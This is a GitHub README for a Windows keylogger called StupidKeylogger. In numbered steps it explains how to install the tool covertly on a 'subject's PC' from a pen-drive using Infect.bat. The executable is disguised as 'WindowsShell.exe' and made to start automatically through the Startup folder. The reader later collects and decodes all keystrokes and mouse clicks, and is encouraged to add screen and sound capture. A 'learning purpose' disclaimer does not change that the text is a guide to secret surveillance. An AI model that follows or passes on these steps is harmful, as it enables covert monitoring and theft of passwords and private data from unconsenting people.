<h1> <img src="https://cloud.githubusercontent.com/assets/5456665/22565016/e5cda4fc-e9b0-11e6-9d02-211b4a84c558.png" width="24" height=auto /> StupidKeylogger </h1>

#### A Terrific Keystroke Recorder

This tacky program hides itself in the subject’s PC (Windows XP or later), and silently records all keyboard and mouse operations. It is launched automatically with PC start, then stores data in ASCII code with record-date. Now all you have to do is- collect the record, and decode it.

**This project is created only for learning purpose.**

### How to use?

1. Download the full package from [here](https://github.com/MinhasKamal/StupidKeylogger/archive/application.zip), unzip it, and move it to your pen-drive. It should look something like this-

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="StupidKeylogger"/>
 </div>

 **WindowsShell.exe** is the compiled and renamed form of [**Keylogger.cpp**](https://github.com/MinhasKamal/StupidKeylogger/blob/master/com/minhaskamal/stupidKeylogger/Keylogger.cpp). Of course you do not expect others to let you insert a pen-drive containing keylogger; even if that is stupid! **WindowsShell** is the link file of **WindowsShell.exe**. 

2. Insert your pen-drive in a computer and run **Infect.bat**. This will install **WindowsShell.exe** (in the *%appdata%* folder) & **WindowsShell.lnk** (in *%appdata%\Microsoft\Windows\Start Menu\Programs\Startup*) in that PC, and start it. 

3. Wait for some days <i>(I know it is hard but be patient)</i>, then return to the PC, insert the pen-drive and run **CollectData.bat**. You will get a file named **Record.log**. This is what it contains-

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/20914395/89d6b268-bba9-11e6-9586-dae692aa0405.png" alt="Record" width="600px" height=auto />
 </div>

4. Now, simply run **RecordDecoder.exe** (keep **Record.log** in the same folder & do not rename it), and you will get **Data.log**. This file contains all the key-strokes and mouse-clicks. It is all up to you now to find necessary information from this (good luck with that!). 

 <div align="center">
   <img src="https://cloud.githubusercontent.com/assets/5456665/20915077/d9e3ffbe-bbad-11e6-87f1-d7c079c3cfb7.png" alt="Data" width="600px" height=auto />
 </div>

 You may use [**RecordDecoderFocused**](https://github.com/MinhasKamal/StupidKeylogger/blob/master/com/minhaskamal/stupidKeylogger/RecordDecoderFocused.cpp) instead of **RecordDecoder.exe**, it will get rid of some unnecessary data automatically for you.

5. If you want to remove the Keylogger from that PC, run **Cure.bat**.

Surely you can use it in many other ways; and also enhance its ability by adding a screen capturer, or sound recorder, and so on.

**Note:** *I will not take any responsibility of someone else's ill act with my program*. But I do believe that a real learner will learn a lot from this.

This is actually a pre-project for [TrojanCockroach](https://github.com/MinhasKamal/TrojanCockroach).

### License
<a rel="license" href="https://opensource.org/licenses/MIT"><img alt="MIT License" src="https://cloud.githubusercontent.com/assets/5456665/18950087/fbe0681a-865f-11e6-9552-e59d038d5913.png" width="60em" height=auto/></a><br/><a href="https://github.com/MinhasKamal/StupidKeylogger">StupidKeylogger</a> is licensed under <a rel="license" href="https://opensource.org/licenses/MIT">MIT License</a>.
